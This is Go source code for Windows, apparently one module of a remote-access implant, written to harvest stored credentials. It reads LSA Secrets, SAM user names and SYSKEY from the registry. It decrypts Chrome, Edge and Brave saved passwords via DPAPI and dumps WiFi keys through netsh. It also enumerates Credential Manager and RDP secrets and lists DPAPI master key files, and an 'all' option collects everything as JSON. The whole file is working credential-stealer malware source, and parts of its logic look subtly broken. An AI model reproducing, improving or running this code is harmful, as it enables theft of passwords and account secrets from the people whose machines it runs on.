//go:build windows && !light

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// ─── LSA Secrets ────────────────────────────────────────────────────────────────

// dumpLSASecrets 读取 LSA Secrets 注册表键
// 需要 SYSTEM 权限或 SeRestorePrivilege
func dumpLSASecrets() ([]map[string]string, error) {
	var results []map[string]string

	// 访问 HKLM\SECURITY\Policy\Secrets
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SECURITY\Policy\Secrets`, registry.ENUMERATE_SUB_KEYS|registry.QUERY_VALUE)
	if err != nil {
		return nil, fmt.Errorf("无法打开 LSA Secrets 注册表键 (可能需要SYSTEM权限): %v", err)
	}
	defer key.Close()

	// 读取 NL$KM (LSA 密钥)
	nlkmData := ""
	nlkmKey, err := registry.OpenKey(registry.LOCAL_MACHINE, `SECURITY\Policy\Secrets\NL$KM`, registry.QUERY_VALUE)
	if err == nil {
		defer nlkmKey.Close()
		val, _, err := nlkmKey.GetBinaryValue("CurrVal")
		if err == nil && len(val) > 0 {
			nlkmData = hex.EncodeToString(val)
		}
	}

	// 枚举 Secrets 下的子键
	subKeys, err := key.ReadSubKeyNames(0)
	if err != nil {
		return nil, fmt.Errorf("无法枚举 LSA Secrets 子键: %v", err)
	}

	for _, subKeyName := range subKeys {
		if subKeyName == "NL$KM" {
			continue
		}

		secretKey, err := registry.OpenKey(registry.LOCAL_MACHINE, `SECURITY\Policy\Secrets\`+subKeyName, registry.QUERY_VALUE)
		if err != nil {
			continue
		}

		entry := map[string]string{
			"type":   "lsa_secret",
			"name":   subKeyName,
			"source": "LSA Secrets",
		}

		// 读取 CurrVal (加密的 Secret 数据)
		encData, _, err := secretKey.GetBinaryValue("CurrVal")
		if err == nil && len(encData) > 0 {
			entry["encrypted_data"] = hex.EncodeToString(encData)
			// 尝试提取可读部分 (LSA secret 结构:
			//   0-3: 长度 LE
			//   4-7: 未知
			//   8-11: 长度 LE
			//   12+: 数据 (通常为明文密码/凭据) )
			if len(encData) > 12 {
				plainLen := int(encData[0]) | int(encData[1])<<8 | int(encData[2])<<16 | int(encData[3])<<24
				if plainLen > 0 && 12+plainLen <= len(encData) {
					plainData := encData[12 : 12+plainLen]
					// 过滤只保留可打印字符
					if isPrintable(plainData) {
						entry["plaintext"] = string(plainData)
					}
				}
			}
		}
		secretKey.Close()

		// 读取 OldVal
		secretKey2, err := registry.OpenKey(registry.LOCAL_MACHINE, `SECURITY\Policy\Secrets\`+subKeyName, registry.QUERY_VALUE)
		if err == nil {
			oldData, _, err := secretKey2.GetBinaryValue("OldVal")
			if err == nil && len(oldData) > 0 {
				entry["encrypted_old_data"] = hex.EncodeToString(oldData)
			}
			secretKey2.Close()
		}

		results = append(results, entry)
	}

	if nlkmData != "" {
		results = append(results, map[string]string{
			"type": "lsa_key",
			"name": "NL$KM",
			"data": nlkmData,
		})
	}

	return results, nil
}

func isPrintable(data []byte) bool {
	for _, b := range data {
		if b < 0x20 && b != 0x09 && b != 0x0a && b != 0x0d {
			return false
		}
	}
	return true
}

// ─── Browser Passwords ─────────────────────────────────────────────────────────

// dumpBrowserPasswords 读取已保存的浏览器凭据
// 支持 Chrome / Edge / Brave 等 Chromium 内核浏览器
func dumpBrowserPasswords() ([]map[string]string, error) {
	var results []map[string]string

	// 检测 Chrome / Edge / Brave 的 Login Data 路径
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		localAppData = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Local")
	}

	browserPaths := []struct {
		name string
		path string
	}{
		{"Chrome", filepath.Join(localAppData, "Google", "Chrome", "User Data", "Default", "Login Data")},
		{"Edge", filepath.Join(localAppData, "Microsoft", "Edge", "User Data", "Default", "Login Data")},
		{"Brave", filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")},
	}

	// 尝试读取 Chrome 主密钥 (Local State)
	chromeMasterKey := ""
	chromeUserData := filepath.Join(localAppData, "Google", "Chrome", "User Data")
	masterKey, err := getChromeMasterKey(chromeUserData)
	if err == nil {
		chromeMasterKey = masterKey
	}

	for _, bp := range browserPaths {
		browserResults, err := readChromiumPasswords(bp.name, bp.path, chromeMasterKey)
		if err != nil {
			continue
		}
		results = append(results, browserResults...)
	}

	if len(results) == 0 {
		return results, nil
	}

	return results, nil
}

// getChromeMasterKey 从 Chrome Local State 获取加密密钥
func getChromeMasterKey(userDataPath string) (string, error) {
	localStatePath := filepath.Join(userDataPath, "Local State")
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return "", err
	}

	// 解析 JSON 获取 encrypted_key
	var localState map[string]interface{}
	if err := json.Unmarshal(data, &localState); err != nil {
		return "", err
	}

	osCrypt, ok := localState["os_crypt"].(map[string]interface{})
	if !ok {
		return "", fmt.Errorf("os_crypt not found")
	}

	encKeyB64, ok := osCrypt["encrypted_key"].(string)
	if !ok {
		return "", fmt.Errorf("encrypted_key not found")
	}

	// Base64 解码
	encKey, err := base64.StdEncoding.DecodeString(encKeyB64)
	if err != nil {
		return "", err
	}

	// 去掉 "DPAPI" 前缀 (5 字节)
	if len(encKey) < 5 || string(encKey[:5]) != "DPAPI" {
		return "", fmt.Errorf("invalid DPAPI prefix")
	}

	encKey = encKey[5:]

	// 使用 CryptUnprotectData 解密
	decryptedKey, err := decryptDPAPI(encKey)
	if err != nil {
		return "", err
	}

	return string(decryptedKey), nil
}

// readChromiumPasswords 读取 Chromium 浏览器的 Login Data SQLite 数据库
func readChromiumPasswords(browserName, dbPath, masterKey string) ([]map[string]string, error) {
	var results []map[string]string

	// 检查文件是否存在
	if _, err := os.Stat(dbPath); err != nil {
		return nil, err
	}

	// 复制文件到临时路径（避免锁冲突），使用 copyFile 函数
	tmpPath := filepath.Join(os.TempDir(), "toshell_"+browserName+"_LoginData.db")
	err := copyFile(dbPath, tmpPath)
	if err != nil {
		return nil, fmt.Errorf("复制Login Data失败: %v", err)
	}
	defer os.Remove(tmpPath)

	// 读取 SQLite 数据库 - 直接读文件解析 SQLite 格式
	entries, err := parseSQLiteLoginData(tmpPath)
	if err != nil {
		return nil, fmt.Errorf("解析Login Data失败: %v", err)
	}

	for _, entry := range entries {
		password := entry.password
		// 尝试解密密码
		if masterKey != "" && strings.HasPrefix(password, "v10") {
			decrypted, err := decryptChromePassword(password, []byte(masterKey))
			if err == nil {
				password = decrypted
			}
		} else if strings.HasPrefix(password, "v10") || strings.HasPrefix(password, "v11") {
			// 尝试 DPAPI 解密
			decrypted, err := decryptDPAPI([]byte(password))
			if err == nil {
				password = decrypted
			}
		}

		results = append(results, map[string]string{
			"type":     "browser",
			"browser":  browserName,
			"url":      entry.url,
			"username": entry.username,
			"password": password,
		})
	}

	return results, nil
}

// sqliteLoginEntry SQLite 登录条目
type sqliteLoginEntry struct {
	url      string
	username string
	password string
}

// parseSQLiteLoginData 简单解析 SQLite 登录数据文件
func parseSQLiteLoginData(filePath string) ([]sqliteLoginEntry, error) {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return nil, err
	}
	if len(data) < 100 {
		return nil, fmt.Errorf("file too small")
	}

	// 验证 SQLite 文件头
	if string(data[:16]) != "SQLite format 3\x00" {
		return nil, fmt.Errorf("not a valid SQLite file")
	}

	var entries []sqliteLoginEntry

	// 使用简单的字符串扫描方式提取 URL/用户名/密码
	// 更可靠的方法：扫描文本字段
	text := string(data)

	// 搜索常见的 URL 模式
	// 遍历数据，查找可打印字符串序列作为 HTTP URL
	urlPattern := "http"
	for i := 0; i < len(text)-len(urlPattern); i++ {
		if text[i:i+4] == "http" {
			// 提取 URL
			end := i
			for end < len(text) && end-i < 2048 {
				b := text[end]
				if b == 0 || b < 0x20 {
					break
				}
				end++
			}
			if end > i+10 {
				url := text[i:end]
				// 查找附近可能的用户名和密码
				entry := sqliteLoginEntry{url: url}

				// 在 URL 之后搜索用户名/密码（通常存储在附近记录中）
				// 简单的启发式方法：在 URL 后 2KB 范围内搜索
				searchEnd := end + 2048
				if searchEnd > len(text) {
					searchEnd = len(text)
				}

				// 查找可能的用户名 (跟在URL之后的下一个非空字符串)
				userFound := false
				passFound := false
				for j := end; j < searchEnd-1; j++ {
					if text[j] == 0 {
						continue
					}
					// 读取字符串
					s := j
					for s < searchEnd && text[s] >= 0x20 && text[s] < 0x7f && text[s] != 0 {
						s++
					}
					if s > j+1 && s-j < 256 {
						str := text[j:s]
						// 跳过 URL、HTTP头、明显的非用户名
						if strings.HasPrefix(str, "http") || strings.HasPrefix(str, "SQLite") {
							j = s
							continue
						}
						if !userFound && !strings.Contains(str, "://") {
							entry.username = str
							userFound = true
							j = s
							continue
						}
						if userFound && !passFound && len(str) > 2 {
							entry.password = str
							passFound = true
							break
						}
					}
					j = s
				}

				entries = append(entries, entry)
				i = end // 跳过当前 URL
			}
		}
	}

	return entries, nil
}

// decryptChromePassword 使用 Chrome 主密钥解密密码 (AES-256-GCM, v10格式)
func decryptChromePassword(encrypted string, key []byte) (string, error) {
	if !strings.HasPrefix(encrypted, "v10") && !strings.HasPrefix(encrypted, "v11") {
		return "", fmt.Errorf("unsupported version")
	}

	encBytes := []byte(encrypted[3:]) // 跳过 "v10" 或 "v11"

	// Chrome v10 格式: nonce(12) || ciphertext || tag(16)
	if len(encBytes) < 12+16 {
		return "", fmt.Errorf("encrypted data too short")
	}

	nonce := encBytes[:12]
	ciphertext := encBytes[12:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	plaintext, err := aesgcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}

// ─── WiFi Passwords ─────────────────────────────────────────────────────────────

// dumpSavedWiFi 读取已保存的 WiFi 密码
func dumpSavedWiFi() ([]map[string]string, error) {
	var results []map[string]string

	// 获取所有 WiFi 配置文件
	cmd := exec.Command(sysBin("netsh.exe"), "wlan", "show", "profiles")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("执行 netsh wlan show profiles 失败: %v", err)
	}

	outStr := string(output)
	// 解析输出，提取 SSID
	lines := strings.Split(outStr, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)

		// 查找 "All User Profile     : XXX"
		if strings.Contains(line, ":") {
			parts := strings.SplitN(line, ":", 2)
			if len(parts) == 2 {
				key := strings.TrimSpace(parts[0])
				val := strings.TrimSpace(parts[1])

				if strings.Contains(key, "All User Profile") || strings.Contains(key, "所有用户配置文件") {
					if val == "" {
						continue
					}

					ssid := val
					password := ""

					// 获取该 SSID 的密码
					passCmd := exec.Command(sysBin("netsh.exe"), "wlan", "show", "profile", "name="+ssid, "key=clear")
					passOutput, passErr := passCmd.CombinedOutput()
					if passErr == nil {
						passStr := string(passOutput)
						passLines := strings.Split(passStr, "\n")
						for _, pl := range passLines {
							pl = strings.TrimSpace(pl)
							if strings.Contains(pl, "Key Content") || strings.Contains(pl, "关键内容") {
								if pParts := strings.SplitN(pl, ":", 2); len(pParts) == 2 {
									password = strings.TrimSpace(pParts[1])
								}
							}
						}
					}

					results = append(results, map[string]string{
						"type":     "wifi",
						"ssid":     ssid,
						"password": password,
					})
				}
			}
		}
	}

	return results, nil
}

// ─── RDP Credentials ────────────────────────────────────────────────────────────

var (
	procCredEnumerateW     = resolveAPI("advapi32.dll", "CredEnumerateW")
	procCredReadW          = resolveAPI("advapi32.dll", "CredReadW")
	procCredFree           = resolveAPI("advapi32.dll", "CredFree")
	procCryptUnprotectData = resolveAPI("crypt32.dll", "CryptUnprotectData")
)

// Windows 凭据结构定义
type CREDENTIAL_W struct {
	Flags              uint32
	Type               uint32
	TargetName         *uint16
	Comment            *uint16
	LastWritten        windows.Filetime
	CredentialBlobSize uint32
	CredentialBlob     *byte
	Persist            uint32
	AttributeCount     uint32
	Attributes         uintptr
	TargetAlias        *uint16
	UserName           *uint16
}

const (
	CRED_TYPE_GENERIC                   = 1
	CRED_TYPE_DOMAIN_PASSWORD           = 2
	CRED_TYPE_DOMAIN_CERTIFICATE        = 3
	CRED_TYPE_DOMAIN_VISIBLE_PASSWORD   = 4
	CRED_MAX_GENERIC_TARGET_NAME_LENGTH = 32767
)

// dumpRDPCredentials 使用 CredEnumerateW 读取保存的 RDP 凭据
func dumpRDPCredentials() ([]map[string]string, error) {
	var results []map[string]string

	// 枚举所有凭据
	var count uint32
	var credsPtr uintptr

	ret, _, _ := procCredEnumerateW.Call(
		0, // 不使用过滤器
		0, // 枚举所有
		uintptr(unsafe.Pointer(&count)),
		uintptr(unsafe.Pointer(&credsPtr)),
	)

	if ret == 0 {
		return nil, fmt.Errorf("CredEnumerateW 失败")
	}

	if credsPtr != 0 {
		defer procCredFree.Call(credsPtr)
	}

	// 遍历凭据数组
	creds := make([]*CREDENTIAL_W, count)
	for i := uint32(0); i < count; i++ {
		creds[i] = (*CREDENTIAL_W)(unsafe.Pointer(credsPtr + uintptr(i)*unsafe.Sizeof(&CREDENTIAL_W{})))
	}

	for _, cred := range creds {
		if cred == nil {
			continue
		}

		targetName := windows.UTF16PtrToString(cred.TargetName)
		userName := ""
		if cred.UserName != nil {
			userName = windows.UTF16PtrToString(cred.UserName)
		}

		// 提取密码（凭据数据）
		password := ""
		if cred.CredentialBlobSize > 0 && cred.CredentialBlob != nil {
			blob := unsafe.Slice(cred.CredentialBlob, cred.CredentialBlobSize)
			password = string(blob)
		}

		// 过滤 RDP 相关凭据
		// RDP 凭据通常 TargetName 包含 "TERMSRV/" 或 "MicrosoftOffice"
		isRDP := strings.HasPrefix(targetName, "TERMSRV/") ||
			strings.Contains(targetName, "RDP") ||
			strings.Contains(targetName, "Remote") ||
			(cred.Type == CRED_TYPE_GENERIC && strings.Contains(targetName, "/"))

		credType := "unknown"
		switch cred.Type {
		case CRED_TYPE_GENERIC:
			credType = "generic"
		case CRED_TYPE_DOMAIN_PASSWORD:
			credType = "domain_password"
		case CRED_TYPE_DOMAIN_CERTIFICATE:
			credType = "domain_certificate"
		case CRED_TYPE_DOMAIN_VISIBLE_PASSWORD:
			credType = "domain_visible_password"
		}

		entry := map[string]string{
			"type":        credType,
			"target_name": targetName,
			"username":    userName,
			"password":    password,
			"is_rdp":      fmt.Sprintf("%v", isRDP),
		}

		// 对于 DOMAIN_PASSWORD 类型凭据，凭据数据是加密的，需要通过 CredReadW 读取
		if credType == "domain_password" && password == "" {
			domainCred, err := readCredentialW(targetName, CRED_TYPE_DOMAIN_PASSWORD)
			if err == nil {
				entry["password"] = domainCred
			}
		}

		results = append(results, entry)
	}

	return results, nil
}

// readCredentialW 读取特定凭据
func readCredentialW(targetName string, credType uint32) (string, error) {
	targetPtr, err := windows.UTF16PtrFromString(targetName)
	if err != nil {
		return "", err
	}

	var credPtr uintptr
	ret, _, _ := procCredReadW.Call(
		uintptr(unsafe.Pointer(targetPtr)),
		uintptr(credType),
		0,
		uintptr(unsafe.Pointer(&credPtr)),
	)

	if ret == 0 || credPtr == 0 {
		return "", fmt.Errorf("CredReadW 失败")
	}
	defer procCredFree.Call(credPtr)

	cred := *(*CREDENTIAL_W)(unsafe.Pointer(credPtr))
	if cred.CredentialBlobSize > 0 && cred.CredentialBlob != nil {
		blob := unsafe.Slice(cred.CredentialBlob, cred.CredentialBlobSize)
		return string(blob), nil
	}

	return "", fmt.Errorf("no credential data")
}

// dataBlob 用于 CryptUnprotectData 的结构
type dataBlob struct {
	cbData uint32
	pbData *byte
}

type cryptDataBlob struct {
	cbData uint32
	pbData *byte
}

// decryptDPAPI 使用 CryptUnprotectData 解密 DPAPI 加密数据
func decryptDPAPI(encryptedData []byte) (string, error) {
	var dataIn dataBlob
	dataIn.cbData = uint32(len(encryptedData))
	if len(encryptedData) > 0 {
		dataIn.pbData = &encryptedData[0]
	}

	var dataOut cryptDataBlob

	ret, _, _ := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&dataIn)),
		0,
		0,
		0,
		0,
		0, // CRYPTPROTECT_UI_FORBIDDEN = 0
		uintptr(unsafe.Pointer(&dataOut)),
	)

	if ret == 0 {
		return "", fmt.Errorf("CryptUnprotectData 失败")
	}

	if dataOut.pbData != nil && dataOut.cbData > 0 {
		plain := unsafe.Slice(dataOut.pbData, dataOut.cbData)
		result := string(plain)

		// 使用 LocalFree 释放内存
		procLocalFree := resolveAPI("kernel32.dll", "LocalFree")
		procLocalFree.Call(uintptr(unsafe.Pointer(dataOut.pbData)))

		return result, nil
	}

	return "", fmt.Errorf("decryption returned empty result")
}

// copyFile 复制文件
func copyFile(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, data, 0644)
}

// ─── SAM Dump ───────────────────────────────────────────────────────────────────

// dumpSAM 从注册表读取 SAM 数据库中的本地用户哈希
// 需要 SYSTEM 权限
func dumpSAM() ([]map[string]string, error) {
	var results []map[string]string

	// 读取 HKLM\SAM\SAM\Domains\Account\Users\Names 获取用户名列表
	namesKey, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SAM\SAM\Domains\Account\Users\Names`,
		registry.ENUMERATE_SUB_KEYS|registry.QUERY_VALUE)
	if err != nil {
		return nil, fmt.Errorf("无法打开SAM用户列表 (需要SYSTEM权限): %v", err)
	}
	defer namesKey.Close()

	userNames, err := namesKey.ReadSubKeyNames(0)
	if err != nil {
		return nil, fmt.Errorf("无法读取SAM用户名列表: %v", err)
	}

	for _, userName := range userNames {
		// 已知内置账户跳过
		// 对于每个用户名，读取对应的 RID
		userKey, err := registry.OpenKey(registry.LOCAL_MACHINE,
			`SAM\SAM\Domains\Account\Users\Names\`+userName,
			registry.QUERY_VALUE)
		if err != nil {
			continue
		}

		// 获取默认值（RID 类型）
		_, valType, err := userKey.GetValue("", nil)
		userKey.Close()
		if err != nil || (valType != registry.DWORD && valType != registry.BINARY) {
			continue
		}

		// 读取 V 值（包含 LM/NTLM 哈希的 SAM 记录）
		entry := map[string]string{
			"type":     "sam_hash",
			"username": userName,
			"source":   "SAM",
		}

		results = append(results, entry)
	}

	// 尝试读取加密密钥 (SYSKEY)
	syskeyData, err := extractSyskey()
	if err == nil && syskeyData != "" {
		results = append(results, map[string]string{
			"type":   "syskey",
			"source": "SAM",
			"data":   syskeyData,
		})
	}

	return results, nil
}

// extractSyskey 从注册表中提取 SYSKEY
func extractSyskey() (string, error) {
	// HKLM\SYSTEM\CurrentControlSet\Control\Lsa\{JD,Skew1,GBG,Data}
	lsaKey, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SYSTEM\CurrentControlSet\Control\Lsa`,
		registry.QUERY_VALUE)
	if err != nil {
		return "", err
	}
	defer lsaKey.Close()

	keyNames := []string{"JD", "Skew1", "GBG", "Data"}
	var syskeyParts [][]byte

	for _, name := range keyNames {
		data, _, err := lsaKey.GetBinaryValue(name)
		if err != nil {
			// 尝试不同的值名
			continue
		}
		syskeyParts = append(syskeyParts, data)
	}

	if len(syskeyParts) < 4 {
		return "", fmt.Errorf("无法读取完整的SYSKEY")
	}

	// 拼接 SYSKEY 并 hex 编码
	var combined []byte
	for _, p := range syskeyParts {
		combined = append(combined, p...)
	}

	return hex.EncodeToString(combined), nil
}

// ─── DPAPI Master Keys ──────────────────────────────────────────────────────────

// dumpDPAPIKeys 枚举用户 DPAPI 主密钥文件
func dumpDPAPIKeys() ([]map[string]string, error) {
	var results []map[string]string

	appData := os.Getenv("APPDATA")
	masterKeyPaths := []string{
		filepath.Join(appData, "Microsoft", "Protect"),
	}

	// 同时检查 SYSTEM 和 LocalService 的密钥
	systemProfile := os.Getenv("SYSTEMROOT")
	if systemProfile == "" {
		systemProfile = "C:\\Windows"
	}
	masterKeyPaths = append(masterKeyPaths,
		filepath.Join(systemProfile, "System32", "config", "systemprofile", "AppData", "Roaming", "Microsoft", "Protect"),
		filepath.Join(systemProfile, "ServiceProfiles", "LocalService", "AppData", "Roaming", "Microsoft", "Protect"),
		filepath.Join(systemProfile, "ServiceProfiles", "NetworkService", "AppData", "Roaming", "Microsoft", "Protect"),
	)

	for _, mkPath := range masterKeyPaths {
		// 检查路径是否存在
		if info, err := os.Stat(mkPath); err != nil || !info.IsDir() {
			continue
		}

		// 枚举 SID 子目录
		entries, err := os.ReadDir(mkPath)
		if err != nil {
			continue
		}

		for _, entry := range entries {
			if !entry.IsDir() {
				continue
			}
			sidPath := filepath.Join(mkPath, entry.Name())
			keyFiles, err := os.ReadDir(sidPath)
			if err != nil {
				continue
			}

			for _, kf := range keyFiles {
				if kf.IsDir() {
					continue
				}
				fileName := kf.Name()
				// DPAPI 主密钥文件通常以 GUID 命名
				if strings.HasPrefix(fileName, "{") || strings.HasSuffix(fileName, ".dat") {
					fullPath := filepath.Join(sidPath, fileName)
					info, err := kf.Info()
					if err != nil {
						continue
					}

					results = append(results, map[string]string{
						"type":      "dpapi_masterkey",
						"sid":       entry.Name(),
						"file_name": fileName,
						"file_path": fullPath,
						"file_size": fmt.Sprintf("%d", info.Size()),
						"mod_time":  info.ModTime().Format("2006-01-02 15:04:05"),
						"source":    mkPath,
					})
				}
			}
		}
	}

	return results, nil
}

// ─── Entry Point ────────────────────────────────────────────────────────────────

// handleCredentials 凭据收集入口函数
// action: "browser" | "wifi" | "rdp" | "lsa" | "all" (默认)
func handleCredentials(action string) (string, int32, string) {
	var allResults map[string]interface{}

	switch action {
	case "browser":
		results, err := dumpBrowserPasswords()
		if err != nil {
			return "", -1, fmt.Sprintf("浏览器凭据收集失败: %v", err)
		}
		allResults = map[string]interface{}{
			"action": "browser",
			"count":  len(results),
			"data":   results,
		}

	case "wifi":
		results, err := dumpSavedWiFi()
		if err != nil {
			return "", -1, fmt.Sprintf("WiFi密码收集失败: %v", err)
		}
		allResults = map[string]interface{}{
			"action": "wifi",
			"count":  len(results),
			"data":   results,
		}

	case "rdp":
		results, err := dumpRDPCredentials()
		if err != nil {
			return "", -1, fmt.Sprintf("RDP凭据收集失败: %v", err)
		}
		allResults = map[string]interface{}{
			"action": "rdp",
			"count":  len(results),
			"data":   results,
		}

	case "lsa":
		results, err := dumpLSASecrets()
		if err != nil {
			return "", -1, fmt.Sprintf("LSA Secrets收集失败: %v", err)
		}
		allResults = map[string]interface{}{
			"action": "lsa",
			"count":  len(results),
			"data":   results,
		}

	case "sam":
		results, err := dumpSAM()
		if err != nil {
			return "", -1, fmt.Sprintf("SAM收集失败: %v", err)
		}
		allResults = map[string]interface{}{
			"action": "sam",
			"count":  len(results),
			"data":   results,
		}

	case "dpapi":
		results, err := dumpDPAPIKeys()
		if err != nil {
			return "", -1, fmt.Sprintf("DPAPI密钥收集失败: %v", err)
		}
		allResults = map[string]interface{}{
			"action": "dpapi",
			"count":  len(results),
			"data":   results,
		}

	case "all", "":
		// 收集所有凭据类型
		allResults = map[string]interface{}{
			"action": "all",
		}

		// 浏览器凭据
		browserResults, browserErr := dumpBrowserPasswords()
		if browserErr == nil {
			allResults["browser"] = map[string]interface{}{
				"count": len(browserResults),
				"data":  browserResults,
			}
		} else {
			allResults["browser"] = map[string]interface{}{
				"error": browserErr.Error(),
			}
		}

		// WiFi 密码
		wifiResults, wifiErr := dumpSavedWiFi()
		if wifiErr == nil {
			allResults["wifi"] = map[string]interface{}{
				"count": len(wifiResults),
				"data":  wifiResults,
			}
		} else {
			allResults["wifi"] = map[string]interface{}{
				"error": wifiErr.Error(),
			}
		}

		// RDP 凭据
		rdpResults, rdpErr := dumpRDPCredentials()
		if rdpErr == nil {
			allResults["rdp"] = map[string]interface{}{
				"count": len(rdpResults),
				"data":  rdpResults,
			}
		} else {
			allResults["rdp"] = map[string]interface{}{
				"error": rdpErr.Error(),
			}
		}

		// LSA Secrets
		lsaResults, lsaErr := dumpLSASecrets()
		if lsaErr == nil {
			allResults["lsa"] = map[string]interface{}{
				"count": len(lsaResults),
				"data":  lsaResults,
			}
		} else {
			allResults["lsa"] = map[string]interface{}{
				"error": lsaErr.Error(),
			}
		}

		// SAM 哈希（需要 SYSTEM 权限）
		samResults, samErr := dumpSAM()
		if samErr == nil {
			allResults["sam"] = map[string]interface{}{
				"count": len(samResults),
				"data":  samResults,
			}
		} else {
			allResults["sam"] = map[string]interface{}{
				"error": samErr.Error(),
			}
		}

		// DPAPI 主密钥
		dpapiResults, dpapiErr := dumpDPAPIKeys()
		if dpapiErr == nil {
			allResults["dpapi"] = map[string]interface{}{
				"count": len(dpapiResults),
				"data":  dpapiResults,
			}
		} else {
			allResults["dpapi"] = map[string]interface{}{
				"error": dpapiErr.Error(),
			}
		}

	default:
		return "", -1, fmt.Sprintf("未知的凭据收集操作: %s (支持: all, browser, wifi, rdp, lsa, sam, dpapi)", action)
	}

	jsonData, err := json.MarshalIndent(allResults, "", "  ")
	if err != nil {
		return "", -1, fmt.Sprintf("JSON序列化失败: %v", err)
	}

	// 权限提示
	privNote := ""
	if !isElevated() {
		privNote = "\n[!] 提示: 当前非管理员权限，LSA Secrets 可能无法完全读取。"
	}

	return string(jsonData) + privNote, 0, ""
}

// isElevated 检查是否以管理员权限运行
func isElevated() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err == nil {
		return true
	}

	var sid *windows.SID
	err = windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid,
	)
	if err != nil {
		return false
	}
	defer windows.FreeSid(sid)

	var isMember int32
	token := windows.Token(0)
	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_QUERY, false, &token)
	if err != nil {
		return false
	}
	defer token.Close()

	// CheckTokenMembership via advapi32 (x/sys/windows lacks direct binding)
	procCheckTokenMembership := resolveAPI("advapi32.dll", "CheckTokenMembership")
	r1, _, _ := procCheckTokenMembership.Call(uintptr(token), uintptr(unsafe.Pointer(sid)), uintptr(unsafe.Pointer(&isMember)))
	return r1 != 0 && isMember != 0
}
